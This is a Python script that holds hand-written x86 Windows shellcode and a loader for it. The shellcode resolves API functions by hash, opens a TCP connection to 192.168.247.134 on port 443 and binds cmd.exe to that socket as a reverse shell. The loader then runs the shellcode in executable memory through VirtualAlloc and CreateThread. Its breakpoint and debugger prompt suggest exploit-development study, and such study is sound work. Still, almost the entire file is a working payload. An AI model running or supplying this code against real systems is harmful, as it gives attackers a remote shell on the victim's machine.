import ctypes
import platform

# Generic Imports
import socket
import struct
import sys
from struct import pack

from colorama import Back, Fore, Style
from modules.ipAndPort_module import hexIP, hexPort

# Custom modules
# from modules.keystone_module import keystone_asm
from modules.msfvenom_module import generatePayload
from modules.nasm_module import nasm_asm
from modules.rorHash_module import hashFuncName

# from modules.syscallFinder_module import get_syscall_number    # cant use on <python3.8


def ret_asm() -> str:

    asm = f"""
    START:
        int3                                        ; Remove when not debugging  
    
    SETUP_STACK:
        mov ebp, esp                                ; Initialize stack frame
        sub esp, 0x610                              ; Allocate 1552 bytes of local stack space
    
    FIND_KERNEL32:
        xor ecx, ecx                                ; ECX = 0
        mov esi, fs:[ecx + 0x30]                    ; ESI = PEB (Process Environment Block)
        mov esi, [esi + 0x0C]                       ; ESI = PEB_LDR_DATA (loader data structure)
        mov esi, [esi + 0x1C]                       ; ESI = InInitializationOrderModuleList (first module entry)

    CHECK_NEXT_MODULE:
        mov ebx, [esi + 0x08]                       ; EBX = base address of current module
        mov edi, [esi + 0x20]                       ; EDI = pointer to module name (wide string)
        mov esi, [esi]                              ; ESI = next module in linked list (FLINK)
        cmp [edi + 12*2], cx                        ; Check for null terminator at offset 24 (12th wide char)
        jne CHECK_NEXT_MODULE                       ; If not kernel32, loop to next module


    FIND_FUNCTION_SHORTEN:
        jmp FIND_FUNCTION_SHORTEN_BNC               ; Skip over the actual function code
    
    FIND_FUNCTION_RET:
        pop esi                                     ; Pop return address from call
        mov [ebp + 0x04], esi                       ; Store function address pointer on stack
        jmp RESOLVE_SYMBOLS_TERMINATEPROCESS        ; Jump to resolve kernel32 symbols

    FIND_FUNCTION_SHORTEN_BNC:
        call FIND_FUNCTION_RET                      ; Call to set up function pointer, placed here to generate negative offset


    ; ===== FIND_FUNCTION: Resolves function addresses via Export Address Table (EAT) =====
    FIND_FUNCTION:
        pushad                                      ; Save all general purpose registers
        mov eax, [ebx + 0x3C]                       ; EAX = offset to IMAGE_NT_HEADERS (PE signature location)
        mov edi, [ebx + eax + 0x78]                 ; EDI = Export Table RVA (relative virtual address)
        add edi, ebx                                ; EDI = Export Table VMA (absolute virtual memory address)
        mov ecx, [edi + 0x18]                       ; ECX = number of exported functions
        mov eax, [edi + 0x20]                       ; EAX = AddressOfNames RVA (pointer table RVA)
        add eax, ebx                                ; EAX = AddressOfNames VMA
        mov [ebp - 4], eax                          ; Store on stack for later use in loop

    SEARCH_LOOP:
        jecxz FIND_FUNCTION_DONE                    ; If ECX is 0, all functions checked, exit
        dec ecx                                     ; ECX-- (decrement function counter)
        mov eax, [ebp - 4]                          ; EAX = AddressOfNames VMA
        mov esi, [eax + ecx*4]                      ; ESI = function name RVA (4 bytes per entry)
        add esi, ebx                                ; ESI = function name VMA (string location)

    COMPUTE_HASH:
        xor eax, eax                                ; EAX = 0 (hash accumulator)
        cdq                                         ; EDX = 0 (extend EAX sign to EDX)
        cld                                         ; Clear direction flag (ensures LODSB increments ESI)

    HASH_LOOP:
        lodsb                                       ; AL = byte at [ESI], ESI++ (load function name byte)
        test al, al                                 ; Check if AL is null terminator (end of string)
        jz HASH_DONE                                ; If null byte found, hash computation complete
        ror edx, 0xd                                ; EDX = EDX rotated right 13 bits (ROR hash)
        add edx, eax                                ; EDX += AL (accumulate hash)
        jmp HASH_LOOP                               ; Continue hashing next byte
    HASH_DONE:

    COMPARE_HASH_TO_FUNCTION:
        cmp edx, [esp + 0x24]                       ; Compare computed hash (EDX) with target hash (passed on stack)
        jnz SEARCH_LOOP                             ; If hashes don't match, check next function
        mov edx, [edi + 0x24]                       ; EDX = AddressOfNameOrdinals RVA
        add edx, ebx                                ; EDX = AddressOfNameOrdinals VMA
        mov cx, [edx + ecx*2]                       ; CX = ordinal (2 bytes per entry)
        mov edx, [edi + 0x1C]                       ; EDX = AddressOfFunctions RVA
        add edx, ebx                                ; EDX = AddressOfFunctions VMA
        mov eax, [edx + ecx*4]                      ; EAX = function RVA (4 bytes per entry)
        add eax, ebx                                ; EAX = function VMA (absolute address)
        mov [esp + 0x1c], eax                       ; Store function address on stack for popad restore
    
    FIND_FUNCTION_DONE:
        popad                                       ; Restore all general purpose registers
        ret                                         ; Return to caller

    ; ===== RESOLVE_SYMBOLS_KERNEL32: Push RoR hashes of Functions to load from kernel32.dll =====
    RESOLVE_SYMBOLS_TERMINATEPROCESS:
        push {hashFuncName("TerminateProcess")}     ; Push ROR hash of "TerminateProcess" function name
        call [ebp + 0x04]                           ; Call FIND_FUNCTION to resolve address
        mov [ebp + 0x10], eax                       ; Store TerminateProcess address in [EBP+0x10]
    
    RESOLVE_SYMBOLS_LOADLIBRARYA:
        push {hashFuncName("LoadLibraryA")}         ; Push ROR hash of "LoadLibraryA" function name
        call [ebp + 0x04]                           ; Call FIND_FUNCTION to resolve address
        mov [ebp + 0x14], eax                       ; Store LoadLibraryA address in [EBP+0x14]
    
    RESOLVE_SYMBOLS_CREATEPROCESSA:
        push {hashFuncName("CreateProcessA")}       ; Push ROR hash of "CreateProcessA" function name
        call [ebp + 0x04]                           ; Call FIND_FUNCTION to resolve address
        mov [ebp + 0x18], eax                       ; Store CreateProcessA address in [EBP+0x18]
    
    ; ===== LOAD_WS2_32: Load string to the stack in little endian (\x77\x73\x32\x5f \x33\x32\x2e\x64 \x6c\x6c)  =====
    LOAD_WS2_32:
        xor eax, eax                                ; EAX = 0
        mov ax, 0x6c6c                              ; AX = 'll' (part of "ws2_32.dll")
        push eax                                    ; Push 'll\0\0'
        push 0x642e3233                             ; Push 'd.23'
        push 0x5f327377                             ; Push '_2sw' 
        push esp                                    ; Push pointer to "ws2_32.dll" string
        call [ebp + 0x14]                           ; Call LoadLibraryA("ws2_32.dll") 

    ; ===== RESOLVE_SYMBOLS_WS2_32: Push RoR hashes of Functions to load from ws2_32.dll =====
    RESOLVE_SYMBOLS_WSASTARTUP:
        mov ebx, eax                                ; EBX = base address of ws2_32.dll
        push {hashFuncName("WSAStartup")}           ; Push ROR hash of "WSAStartup" function name
        call [ebp + 0x04]                           ; Call FIND_FUNCTION to resolve address
        mov [ebp + 0x1C], eax                       ; Store WSAStartup address in [EBP+0x1C]

    RESOLVE_SYMBOLS_WSASOCKETA:
        push {hashFuncName("WSASocketA")}           ; Push ROR hash of "WSASocketA" function name
        call [ebp + 0x04]                           ; Call FIND_FUNCTION to resolve address
        mov [ebp + 0x20], eax                       ; Store WSASocketA address in [EBP+0x20]
    
    RESOLVE_SYMBOLS_WSACONNECT:
        push {hashFuncName("WSAConnect")}           ; Push ROR hash of "WSASConnect" function name
        call [ebp + 0x04]                           ; Call FIND_FUNCTION to resolve address
        mov [ebp + 0x24], eax                       ; Store WSASConnect address in [EBP+0x24]

    
    ; ===== CALL_WSASTARTUP: Setup args and call WSAStartup =====
    CALL_WSASTARTUP:
        mov eax, esp                                ; EAX = ESP
        mov cx, 0x590                               ; CX = 0x590
        sub eax, ecx                               ; EAX -= ECX to avoid overwriting stack
        push eax                                    ; Push pointer to WSADATA structure
        xor eax, eax                                ; EAX = 0
        mov ax, 0x0202                              ; AX = MAKEWORD(2,2)
        push eax                                    ; Push wVersionRequested = MAKEWORD(2,2)
        call [ebp + 0x1C]                           ; Call WSAStartup(MAKEWORD(2,2), &WSADATA)

    ; ===== CALL_WSASOCKETA: Setup args and call WSASocketA =====
    ; WSASocketA(AF, Type, Protocol, lpProtocolInfo, g, dwFlags)
    ; AF = 2 (AF_INET)
    ; Type = 1 (SOCK_STREAM)
    ; Protocol = 6 (IPPROTO_TCP)
    ; lpProtocolInfo = NULL <- Requires a pointer to WSAPROTOCOL_INFO struct, not needed here
    ; g = NULL <- Pointer to group id, not needed here
    ; dwFlags = 0 <- No special flags, can be [e.g., WSA_FLAG_OVERLAPPED]


    CALL_WSASOCKETA:
        xor eax, eax                                ; EAX = 0
        push eax                                    ; Push dwFlags = 0
        push eax                                    ; Push g = 0
        push eax                                    ; Push lpProtocolInfo = 0
        mov al, 0x06                                ; EAX = 6 (AL, IPPROTO_TCP)
        push eax                                    ; Push Protocol
        sub al, 0x05                                ; EAX = 1 (Type)
        push eax                                    ; Push Type
        inc eax                                     ; EAX = 2 (AF)
        push eax                                    ; Push AF
        call [ebp + 0x20]                           ; Call WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_IP, 0, 0, 0)


    ; ===== CALL_WSACONNECT: Setup args and call WSAConnect =====
    ; WSAConnect(s, *name, namelen, lpCallerData, lpCalleeData, lpSQOS, lpGQOS)
    ; lpCallerData, lpCalleeData, lpSQOS, lpGQOS = NULL <- REASON:: Legacy|NotUsed
    ; *name = pointer to sockaddr structure
    ; UCHAR s_b1;
    ; UCHAR s_b2;
    ; UCHAR s_b3;
    ; UCHAR s_b4;
    ; USHORT s_w1;
    ; USHORT s_w2;
    ; ULONG S_addr;

    CALL_WSACONNECT:
        mov esi, eax                                ; ESI SOCKET DESCRIPTOR
        xor eax, eax                                ; EAX = 0
        push eax                                    ; Push sin_zero[]
        push eax                                    ; Push sin_zero[]

        ; PUSH IP AND PORT
        push {hexIP("192.168.247.134")} 
        mov ax, {hexPort(443)}                  
        
        shl eax,0x10                                ; Left shift PORT to high word
        add ax, 0x02                                ; AF_INET (sin_family)
        push eax                                    ; Push sin_family and sin_port
        push esp                                    ; Push pointer to sockaddr_in structure
        pop edi                                     ; EDI = pointer to sockaddr_in
        xor eax, eax                                ; EAX = 0
        push eax                                    ; Push lpGQOS
        push eax                                    ; Push lpSQOS
        push eax                                    ; Push lpCallerData
        push eax                                    ; Push lpCalleeData
        add al, 0x10                                ; EAX = 16 (size of sockaddr_in)
        push eax                                    ; Push iSockaddrLength
        push edi                                    ; Push lpSockaddr
        push esi                                    ; Push s (socket descriptor)
        call [ebp + 0x24]                           ; Call WSAConnect

    ; ===== CREATE_PROCESS: Setup args and call CreateProcessA to spawn cmd.exe =====
    ; CreateProcessA(lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles
    ;                dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation)
    ; lpApplicationName = cmd.exe
    ; lpCommandLine = NULL <- can be NULL to use application name
    ; lpProcessAttributes = NULL <- default security, defines inheritance
    ; lpThreadAttributes = NULL <- default security, defines inheritance + ACL
    ; bInheritHandles = TRUE <- inherit handles from parent process
    ; dwCreationFlags = 0 <- default behavior
    ; lpEnvironment = NULL <- use parent process environment
    ; lpCurrentDirectory = NULL <- use parent process current directory
    ; lpStartupInfo = pointer to STARTUPINFO struct
    ; lpProcessInformation = pointer to PROCESS_INFORMATION struct

    ; struct STARTUPINFO [
    ;     DWORD   cb;                   ; Size of the structure in bytes. Default: sizeof(STARTUPINFO) = 0x44
    ;     LPSTR   lpReserved;           ; Reserved, must be NULL
    ;     LPSTR   lpDesktop;            ; Desktop name, set to NULL
    ;     LPSTR   lpTitle;              ; Title for the new process window, set to NULL
    ;     DWORD   dwX;                  ; X position of the window, set to NULL
    ;     DWORD   dwY;                  ; Y position of the window, set to NULL
    ;     DWORD   dwXSize;              ; Width of the window, set to NULL
    ;     DWORD   dwYSize;              ; Height of the window, set to NULL
    ;     DWORD   dwXCountChars;        ; Screen buffer width, set to NULL
    ;     DWORD   dwYCountChars;        ; Screen buffer height, set to NULL
    ;     DWORD   dwFillAttribute;      ; Screen buffer fill attribute, set to NULL
    ;     DWORD   dwFlags;              ; Startup options, set to STARTF_USESTDHANDLES(0x100), needed to redirect std handles    
    ;     WORD    wShowWindow;          ; Window show state, must be NULL to disable cmd window  
    ;     WORD    cbReserved2;          ; Reserved, must be NULL
    ;     LPBYTE  lpReserved2;          ; Reserved, must be NULL
    ;     HANDLE  hStdInput;            ; Standard input handle
    ;     HANDLE  hStdOutput;           ; Standard output handle
    ;     HANDLE  hStdError;            ; Standard error handle
    ; ]
    ; For cmd.exe, cb = 0x44, dwFlags = 0x100, rest are all null
    
    CREATE_STARTUPINFOA:
        push esi                        ; Push hSTDError, ESI currently holds socketDescriptor
        push esi                        ; Push hSTDOutput
        push esi                        ; Push hSTDInput
        xor eax, eax                    ; EAX = 0
        push eax                        ; Push lpReserved2
        push eax                        ; Push cbReserved2 + wShowWindow
        xor ecx, ecx                    ; ECX = 0
        mov al, 0x80                    ; EAX = 0x80
        mov cx, 0x80                    ; CX =  0x80 
        add eax, ecx                    ; EAX = 0x100 (dwFlags = STARTF_USESTDHANDLES)
        push eax                        ; Push dwFlags
        xor eax, eax                    ; EAX = 0
        push eax                        ; Push dwFillAttribute
        push eax                        ; Push dwYCountChars
        push eax                        ; Push dwXCountChars
        push eax                        ; Push dwYSize
        push eax                        ; Push dwXSize
        push eax                        ; Push dwY
        push eax                        ; Push dwX
        push eax                        ; Push lpTitle
        push eax                        ; Push lpDesktop
        push eax                        ; Push lpReserved
        mov eax, 0x44                   ; EAX = 0x44 (size of STARTUPINFO)
        push eax                        ; Push cb
        push esp                        ; Push pointer to STARTUPINFO structure
        pop edi                         ; EDI = pointer to STARTUPINFO

    ;cmd.exe string creation
    CREATE_CMD_STR:
        mov eax, 0xFF9A879B                 ; EAX = 'exe.'
        neg eax
        push eax                            ; Push 'exe.'
        mov eax, 0x2e646d63                 ; EAX = 'cmd.'
        push eax                            ; Push 'cmd.'
        push esp                            ; Push pointer to "cmd.exe" string
        pop ebx                             ; EBX = pointer to "cmd.exe"

    ; everything is ready, call createProcessA
    CALL_CREATEPROCESSA:
        mov eax, esp                    ; EAX = ESP
        xor ecx, ecx                    ; ECX = 0
        mov cx, 0x390                   ; CX = 0x390
        sub eax, ecx                    ; EAX -= ECX to avoid overwriting stack later
        push eax                        ; Push pointer to PROCESS_INFORMATION structure
        push edi                        ; Push pointer to STARTUPINFO structure
        xor eax, eax                    ; EAX = 0
        push eax                        ; Push lpCurrentDirectory = NULL
        push eax                        ; Push lpEnvironment = NULL
        push eax                        ; Push dwCreationFlags = 0
        inc eax                         ; EAX = 1
        push eax                        ; Push bInheritHandles = TRUE
        dec eax                         ; EAX = 0
        push eax                        ; Push lpThreadAttributes = NULL
        push eax                        ; Push lpProcessAttributes = NULL
        push ebx                        ; Push pointer to "cmd.exe" string
        push eax                        ; Push lpApplicationName = NULL
        call [ebp + 0x18]               ; Call CreateProcessA("cmd.exe", NULL, NULL, NULL, TRUE, 0, NULL, NULL, &STARTUPINFO, &PROCESS_INFORMATION)
        


        
    ; ===== EXIT_PROCESS: With everything ready in the stack we can proceed w our func calls here =====
    EXIT_PROCESS:
        xor ecx, ecx                                ; ECX = 0
        push ecx                                    ; Push 0 as exit code parameter
        push 0xFFFFFFFF                             ; Push -1 (current process handle constant)
        call [ebp+0x10]                             ; Call TerminateProcess(hProcess=-1, uExitCode=0)

    """

    return asm


# Keystone
def get_shellcode():
    asm = ret_asm()

    shellcode = b""
    # shellcode += keystone_asm(CODE=asm, debug=True)
    shellcode += nasm_asm(CODE=asm, print=True)

    # keystone_asm returns bytes, so we can return it as a bytesarray
    shellcode = bytearray(shellcode)
    return shellcode


def stuff_ctypes():
    # idk where to put this but ik this comes after shellcode
    shellcode = get_shellcode()

    # load addr of kernel32.dll
    kernel32 = ctypes.windll.kernel32
    if kernel32:
        # print the ptr obj
        print(f"{Fore.LIGHTBLUE_EX}\t o Found {kernel32}{Style.RESET_ALL}")

    # ==================== allocate buffer ====================
    # setup VirtAlloc args
    # arg1: LPVOID lpAddress -> 0x0 because we want the OS to decide
    # arg2: SIZE_T dwSize -> size of shellcode
    # arg3: DWORD flAllocationType -> Default: 0x3000 = MEM_COMMIT(0x1000) | MEM_RESERVE(0x2000)
    # arg4: DWORD flProtect -> Default: 0x40 = PAGE_EXECUTE_READWRITE

    # Ensure correct types for args to VirtualAlloc
    kernel32.VirtualAlloc.argtypes = [
        ctypes.c_void_p,
        ctypes.c_size_t,
        ctypes.c_uint32,
        ctypes.c_uint32,
    ]

    # Ensure correct return type for VirtualAlloc
    kernel32.VirtualAlloc.restype = ctypes.c_void_p

    # call VirtAlloc
    ptr = kernel32.VirtualAlloc(0x0, len(shellcode), 0x3000, 0x40)
    if ptr == 0:
        raise Exception("VirtualAlloc failed")
    else:
        print(
            f"{Fore.LIGHTBLUE_EX}\t o Allocated memory at address: {hex(ptr)}{Style.RESET_ALL}"
        )

    # ==================== copy buffer ====================
    # since shellcode var from get_shellcode() is 'bytes' (read-only),
    # use a copy-backed ctypes buffer
    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
    if not buf:
        raise Exception("Buffer creation failed")
    else:
        # print buffer obj
        print(f"{Fore.LIGHTBLUE_EX}\t o Created buffer object:{Style.RESET_ALL}")
        print(f"{Fore.LIGHTBLUE_EX}\t\t{buf}{Style.RESET_ALL}")

    # ensure correct types for RtlMoveMemory
    kernel32.RtlMoveMemory.argtypes = [
        ctypes.c_void_p,
        ctypes.c_void_p,
        ctypes.c_size_t,
    ]
    # ensure correct return type for RtlMoveMemory
    kernel32.RtlMoveMemory.restype = None

    # copy shellcode into allocated memory
    kernel32.RtlMoveMemory(ptr, buf, len(shellcode))

    # Get current PID
    current_pid = kernel32.GetCurrentProcessId()

    input(
        f"{Fore.LIGHTYELLOW_EX}\n\n\t o Please Attach debugger to python.exe({current_pid}), press enter to continue...\n\n{Style.RESET_ALL}"
    )

    # ==================== create thread ====================
    # setup CreateThread args
    # arg1: LPSECURITY_ATTRIBUTES lpThreadAttributes -> NULL
    # arg2: SIZE_T dwStackSize -> 0 (default)
    # arg3: LPTHREAD_START_ROUTINE lpStartAddress -> ptr to shellcode
    # arg4: LPVOID lpParameter -> NULL
    # arg5: DWORD dwCreationFlags -> 0 (run immediately)
    # arg6: LPDWORD lpThreadId -> NULL

    # Ensure correct types for args to CreateThread
    kernel32.CreateThread.argtypes = [
        ctypes.c_void_p,
        ctypes.c_size_t,
        ctypes.c_void_p,
        ctypes.c_void_p,
        ctypes.c_uint32,
        ctypes.POINTER(ctypes.c_uint32),
    ]

    # Ensure correct return type for CreateThread
    kernel32.CreateThread.restype = ctypes.c_void_p

    # call CreateThread
    thread_id = ctypes.c_uint32(0)
    thread_handle = kernel32.CreateThread(
        None, 0, ptr, None, 0, ctypes.byref(thread_id)
    )
    if thread_handle == 0:
        raise Exception("CreateThread failed")
    else:
        print(
            f"{Fore.LIGHTBLUE_EX}\t o Created thread with ID: {thread_id.value}{Style.RESET_ALL}"
        )

    # ==================== wait for thread ====================
    # setup WaitForSingleObject args
    # arg1: HANDLE hHandle -> thread_handle
    # arg2: DWORD dwMilliseconds -> 0xFFFFFFFF (INFINITE)

    # Ensure correct types for args to WaitForSingleObject
    kernel32.WaitForSingleObject.argtypes = [ctypes.c_void_p, ctypes.c_uint32]
    # Ensure correct return type for WaitForSingleObject
    kernel32.WaitForSingleObject.restype = ctypes.c_uint32

    # call WaitForSingleObject
    result = kernel32.WaitForSingleObject(thread_handle, 0xFFFFFFFF)
    if result != 0:
        raise Exception("WaitForSingleObject failed")
    else:
        print(f"{Fore.LIGHTBLUE_EX}Thread has finished execution.{Style.RESET_ALL}")


if __name__ == "__main__":
    try:
        plat = platform.architecture()
        print(
            f"{Fore.LIGHTWHITE_EX}[+] Python Architecture: {plat[0]}{Style.RESET_ALL}"
        )
        print(f"{Fore.LIGHTWHITE_EX}[+] Platform: {plat[1]}{Style.RESET_ALL}")
        stuff = stuff_ctypes()

        print(f"{Fore.LIGHTRED_EX}[+]{Fore.LIGHTYELLOW_EX} Done!{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.LIGHTRED_EX}{e}")
    except KeyboardInterrupt:
        print(f"{Fore.LIGHTRED_EX}\n\n[!] Caught CTRL+C \nExiting...{Style.RESET_ALL}")
